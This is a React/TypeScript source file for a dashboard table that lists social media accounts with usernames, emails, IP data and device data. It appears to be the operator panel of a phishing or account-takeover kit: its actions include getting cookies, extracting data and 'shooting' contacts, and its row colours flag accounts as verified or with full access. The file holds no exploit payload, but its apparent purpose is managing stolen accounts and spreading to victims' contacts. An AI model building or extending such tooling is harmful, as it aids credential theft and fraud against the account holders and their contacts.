import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faClock, faGlobe, faLaptop } from '@fortawesome/free-solid-svg-icons';
import { useState } from 'react';
import { useWindowSize } from '../../../../hooks/useWindowSize';
import { TableActions } from '../TableActions';
import { getLogoUrl } from '../../../../utils/logoUtils';

interface SocialTableProps {
  data: any[];
  onRowClick: (id: string) => void;
  selectedId: string | null;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onCopy: (text: string) => void;
  onExtract: (id: string) => void;
  onShootContacts: (id: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading: boolean;
}

export const SocialTable: React.FC<SocialTableProps> = ({
  data,
  onRowClick,
  selectedId,
  onVerify,
  onGetCookie,
  onCopy,
  onExtract,
  onShootContacts,
  onMemoSave,
  loading
}) => {
  const [showMemoInput, setShowMemoInput] = useState<string | null>(null);
  const [memoText, setMemoText] = useState('');
  const [lastSaved, setLastSaved] = useState<Date | null>(null);
  const { width } = useWindowSize();

  const getSocialData = (socialsString: string) => {
    try {
      return typeof socialsString === 'string' ? JSON.parse(socialsString) : socialsString;
    } catch (error) {
      console.error('Error parsing socials data:', error);
      return [];
    }
  };

  const getColumns = () => {
    if (width < 768) { // Mobile
      return ['logo', 'platform', 'username', 'actions'];
    } else if (width < 1024) { // Tablet/iPad
      return ['logo', 'timestamp', 'platform', 'username', 'actions'];
    }
    // Large Screen
    return ['logo', 'timestamp', 'platform', 'username', 'email', 'actions'];
  };

  const getRowBackgroundColor = (item: any) => {
    if (item.verified === 'TRUE' && item.fullAccess === 'TRUE') return 'bg-green-50 hover:bg-green-100 dark:bg-green-900 dark:hover:bg-green-800';
    if (item.verified === 'TRUE') return 'bg-amber-50 hover:bg-amber-100 dark:bg-amber-900 dark:hover:bg-amber-800';
    return 'bg-red-50 hover:bg-red-100 dark:bg-red-900 dark:hover:bg-red-800';
  };

  const formatTimestamp = (timestamp: string) => {
    try {
      return new Date(timestamp).toLocaleString();
    } catch (error) {
      return timestamp;
    }
  };

  const handleCopy = (text: string, type: string) => {
    onCopy(text);
    console.log(`${type} copied to clipboard`);
  };

  const columns = getColumns();

  return (
    <div className="overflow-x-auto">
      <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
        <thead className="bg-gray-50 dark:bg-gray-700">
          <tr>
            {columns.map(column => (
              <th key={column} className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
                {column === 'actions' || column === 'logo' ? '' : column}
              </th>
            ))}
          </tr>
        </thead>
        <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
          {data.map((item) => {
            const socials = getSocialData(item.socials);
            // If there are multiple social accounts, create a row for each
            return socials.map((social: any, socialIndex: number) => (
              <tr 
                key={`${item.id}-${socialIndex}`}
                onClick={() => onRowClick(item.id)}
                className={`cursor-pointer ${getRowBackgroundColor(item)} ${selectedId === item.id ? '!bg-blue-50 dark:!bg-blue-900' : ''}`}
              >
                {columns.map(column => (
                  <td key={column} className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-200">
                    {column === 'logo' ? (
                      <div className="flex items-center justify-center">
                        <img 
                          src={getLogoUrl(social.website || social.platform + '.com')} 
                          alt={social.platform}
                          className="h-8 w-8 object-contain"
                          onError={(e) => {
                            const target = e.target as HTMLImageElement;
                            target.style.display = 'none'; // Hide the broken image
                            const fallbackIcon = target.nextElementSibling as HTMLElement;
                            if (fallbackIcon) {
                              fallbackIcon.style.display = 'block'; // Show the fallback icon
                            }
                          }}
                        />
                        {/* Fallback icon */}
                        <FontAwesomeIcon 
                          icon={faGlobe} 
                          className="h-8 w-8 text-gray-400" 
                          style={{ display: 'none' }} // Initially hidden
                        />
                      </div>
                    ) : column === 'actions' ? (
                      <div className="flex items-center justify-end space-x-2">
                        {width >= 768 && (
                          <>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(social.ipData ? JSON.stringify(social.ipData) : item.ipData, 'IP Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy IP Data"
                            >
                              <FontAwesomeIcon icon={faGlobe} />
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(social.deviceData ? JSON.stringify(social.deviceData) : item.deviceData, 'Device Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy Device Data"
                            >
                              <FontAwesomeIcon icon={faLaptop} />
                            </button>
                          </>
                        )}
                        <TableActions
                          item={item}
                          onVerify={onVerify}
                          onGetCookie={onGetCookie}
                          onExtract={onExtract}
                          onShootContacts={onShootContacts}
                          onMemoSave={onMemoSave}
                          loading={loading}
                          category="SOCIAL"
                        />
                      </div>
                    ) : column === 'timestamp' ? (
                      formatTimestamp(item.timestamp)
                    ) : column === 'email' ? (
                      item.email
                    ) : column === 'platform' ? (
                      social.platform
                    ) : column === 'username' ? (
                      social.username
                    ) : column === 'status' ? (
                      social.active ? 'Active' : 'Inactive'
                    ) : (
                      item[column]
                    )}
                  </td>
                ))}
              </tr>
            ));
          })}
        </tbody>
      </table>

      {/* Memo Input Modal */}
      {showMemoInput && (
        <div className="fixed inset-0 bg-black bg-opacity-50 dark:bg-opacity-75 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 max-w-xl w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white">Edit Memo</h2>
              <button onClick={() => setShowMemoInput(null)} className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200">
                ×
              </button>
            </div>
            <textarea
              value={memoText}
              onChange={(e) => setMemoText(e.target.value)}
              onBlur={async () => {
                if (showMemoInput && memoText !== '') {
                  await onMemoSave(showMemoInput, memoText);
                  setLastSaved(new Date());
                }
              }}
              className="w-full h-32 p-2 border rounded dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              placeholder="Enter memo text..."
            />
            {lastSaved && (
              <div className="mt-2 text-sm text-gray-500 dark:text-gray-400">
                <FontAwesomeIcon icon={faClock} className="mr-1" />
                Last saved: {lastSaved.toLocaleTimeString()}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
